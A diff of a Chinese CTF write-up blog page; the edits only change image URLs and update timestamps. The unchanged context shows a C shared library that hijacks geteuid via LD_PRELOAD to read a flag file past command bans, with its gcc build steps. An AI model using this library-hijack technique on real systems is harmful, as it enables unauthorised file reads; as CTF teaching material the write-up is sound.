@@ -22,12 +22,12 @@
 <meta property="og:url" content="//0x48.pw/2016/06/17/0x1C/index.html">
 <meta property="og:site_name" content="Hc1m1">
 <meta property="og:description" content="这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。">
-<meta property="og:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/sanmao.png">
-<meta property="og:updated_time" content="2018-04-02T11:10:22.223Z">
+<meta property="og:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/sanmao.png?x-oss-process=style/blog_sy">
+<meta property="og:updated_time" content="2018-04-03T03:19:41.919Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="三个白帽之招聘又开始了，你怕了吗？-Writeup">
 <meta name="twitter:description" content="这周的三个白帽题听说是前几天ALICTF的招聘题延续，上次两题都没撸出来，这次给了源码终于撸出来了。">
-<meta name="twitter:image" content="https://hcamael.oss-cn-beijing.aliyuncs.com/img/sanmao.png">
+<meta name="twitter:image" content="//hcamael.oss-cn-beijing.aliyuncs.com/img/sanmao.png?x-oss-process=style/blog_sy">
 
 <link rel="apple-touch-icon" href= "/apple-touch-icon.png">
 
@@ -362,7 +362,7 @@
 <p>不过和homework一样，服务器的命令基本都被ban了(像啥nc, cat, python，ls)全被ban了，所以按照homework的套路，用C来读目录和文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">//ddog.c</div><div class="line">#include&lt;stdlib.h&gt;</div><div class="line">#include&lt;stdio.h&gt;</div><div class="line">#include&lt;string.h&gt;</div><div class="line">#include&lt;dirent.h&gt;</div><div class="line"></div><div class="line">void payload() &#123;</div><div class="line">	//DIR *dirp;</div><div class="line">	//struct dirent *dp;</div><div class="line">	FILE *fp, *fp2;</div><div class="line">	char buf[100];</div><div class="line">	//dirp = opendir(&quot;/&quot;);  //flag在/目录下</div><div class="line">	fp = fopen(&quot;/tmp/tteesstt&quot;, &quot;w&quot;);</div><div class="line">	fp2 = fopen(&quot;/flag_gei_ni_ni_Ye_du_bu_LIAO&quot;, &quot;r&quot;);</div><div class="line">	fgets(buf, 100, fp2);</div><div class="line">	fputs(buf, fp);</div><div class="line">	//while ((dp = readdir(dirp)) != NULL) &#123;</div><div class="line">	//	fputs(dp-&gt;d_name, fp);    //得到/flag_gei_ni_ni_Ye_du_bu_LIAO文件路径</div><div class="line">	//&#125;</div><div class="line">	fclose(fp);</div><div class="line">	fclose(fp2);</div><div class="line">	//closedir(dirp);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int geteuid() &#123;</div><div class="line">	if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123;</div><div class="line">		return 0;</div><div class="line">	&#125;</div><div class="line">	unsetenv(&quot;LD_PRELOAD&quot;);</div><div class="line">	payload();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>编译成so库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ gcc -c -fPIC ddog.c -o ddog</div><div class="line">$ gcc -shared ddog -o ddog.so</div></pre></td></tr></table></figure></p>
-<p>得到<code>ddog.so</code>，上传到<code>/tmp</code>，读文件信息一条龙:<br><img src="https://hcamael.oss-cn-beijing.aliyuncs.com/img/sanmao.png" alt="sanmao"></p>
+<p>得到<code>ddog.so</code>，上传到<code>/tmp</code>，读文件信息一条龙:<br><img src="//hcamael.oss-cn-beijing.aliyuncs.com/img/sanmao.png?x-oss-process=style/blog_sy" alt="sanmao"></p>
 
       
     </div>
@@ -374,7 +374,7 @@
         <p><span>本文标题:</span><a href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">Hcamael</a></p>
         <p><span>发布时间:</span>2016-06-17, 15:14:27</p>
-        <p><span>最后更新:</span>2018-04-02, 19:10:22</p>
+        <p><span>最后更新:</span>2018-04-03, 11:19:41</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/06/17/0x1C/" title="三个白帽之招聘又开始了，你怕了吗？-Writeup">//0x48.pw/2016/06/17/0x1C/</a>
             <span class="copy-path" data-clipboard-text="原文: //0x48.pw/2016/06/17/0x1C/　　作者: Hcamael" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
